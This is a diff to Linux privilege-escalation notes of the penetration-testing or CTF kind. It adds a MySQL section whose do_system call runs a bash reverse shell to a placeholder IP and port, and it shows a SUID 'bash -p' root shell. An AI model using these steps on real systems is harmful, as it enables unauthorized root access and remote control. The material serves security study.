@@ -41,6 +41,7 @@ You can display active network connections and listening ports using either nets
  
 ```bash
 ss -anp
+ss -lntp
 netstat -anp
 sudo netstat -ltnp
 ```
@@ -66,7 +67,7 @@ Systems acting as servers often periodically execute various automated, schedule
 Scheduled tasks are listed under the /etc/cron.* directories, where * represents the frequency at which the task will run. For example, tasks that will be run daily can be found under /etc/cron.daily. Each script is listed in its own subdirectory.
 
 ```bash
-ls -lah /etc/cron*
+ll /etc/cron*
 ```
 
 To view the current user's scheduled jobs, we can run crontab followed by the -l parameter. If we try to run the same command with the sudo prefix, you can discover that a backup scripts can be scheduled that you wouldn't otherwise see. In other words, listing cron jobs using sudo reveals jobs run by the root user.
@@ -421,9 +422,6 @@ uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(ww
 # bash -p -i
 bash-5.0# id
 uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
-bash-5.0# cd /root
-bash-5.0# cat proof.txt
-d4eda6b5a66a2db06370f1f7d9545deb
 ```
 
 #### Start-Stop-Daemon
@@ -438,3 +436,31 @@ d4eda6b5a66a2db06370f1f7d9545deb
 ```bash
 cat /etc/exports
 ```
+
+#### MySQL Privesc
+
+If MySQL is running as root and you can login, you can elevate privs by writing files such as a revshell and executing them. Also search for privescs for the specific version that is running, "mysql --version".
+
+```bash
+select do_system('/bin/bash /tmp/bash.sh');
+
+#!/bin/bash
+# bash.sh file
+bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 
+```
+
+Resource: https://www.exploit-db.com/exploits/1518
+
+#### Manual Investigation
+
+Say that you get on a box, and you look at the ports and find multiple things running on the localhost, you want to figure out what these are. If the website is running apache, go into '/etc/apache2/sites-enabled' and read the .conf files to see what's going on.. whether there is a website that you don't know of. See if MySQL is being used for the website, or if it's something else that's worth looking into.
+
+Check all of the .git config files, run git log.
+
+```bash
+find / -type d -name ".git" 2>/dev/null
+```
+
+If you have access to any source code that you can run as admin or another user, check whether the full path is always specified. If not, you can run it out of a directory that you have write access to and go crazy.
+
+Make sure that you investigate the logs folder whenever you run into a .git. Of course, also run git show and git log (redundant).
